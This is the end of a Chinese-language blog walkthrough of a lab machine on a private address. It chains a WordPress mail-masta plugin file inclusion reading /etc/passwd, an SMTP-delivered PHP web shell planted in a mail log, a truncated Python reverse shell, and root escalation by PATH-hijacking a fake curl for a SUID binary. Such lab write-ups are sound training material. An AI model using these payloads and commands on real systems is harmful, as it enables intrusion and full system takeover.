+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.88.151/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+</span></span></code></pre></div><hr>
+<h2 id="3-反弹-shell">3️⃣ 反弹 Shell</h2>
+<p>通过邮件服务写入 PHP payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/var/mail/helios
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>telnet 192.168.88.151 <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>MAIL FROM: MALABIS
+</span></span><span style="display:flex;"><span>RCPT TO: helios
+</span></span><span style="display:flex;"><span>data
+</span></span><span style="display:flex;"><span>&lt;?php system<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;shell&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>QUIT
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 231041.png" alt="屏幕截图 2025-10-29 231041.png"></p>
+<p>反弹：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(...&#39;</span>
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 231921.png" alt="屏幕截图 2025-10-29 231921.png"></p>
+<hr>
+<h2 id="4-path-劫持提权核心步骤">4️⃣ PATH 劫持提权核心步骤</h2>
+<p>交互式 Shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>寻找 SUID：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 232054.png" alt="屏幕截图 2025-10-29 232054.png"></p>
+<p>发现 <code>/opt/statuscheck</code></p>
+<p>逆向分析：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /opt/statuscheck
+</span></span></code></pre></div><p>找到被调用的命令 = <code>curl</code></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 232436.png" alt="屏幕截图 2025-10-29 232436.png"></p>
+<h3 id="构造伪-curl">构造伪 curl：</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; curl
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> curl
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span><span style="display:flex;"><span>echo $PATH
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 232706.png" alt="屏幕截图 2025-10-29 232706.png"></p>
+<p>触发提权：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/statuscheck
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 232813.png" alt="屏幕截图 2025-10-29 232813.png"></p></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://www.hzhsec.top/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql2/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>MySQL：数据请求类型与注入面分析</span></a>
+    
+    
+    <a class="next" href="http://www.hzhsec.top/list/base_bug/xss/xss3/"><span>XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
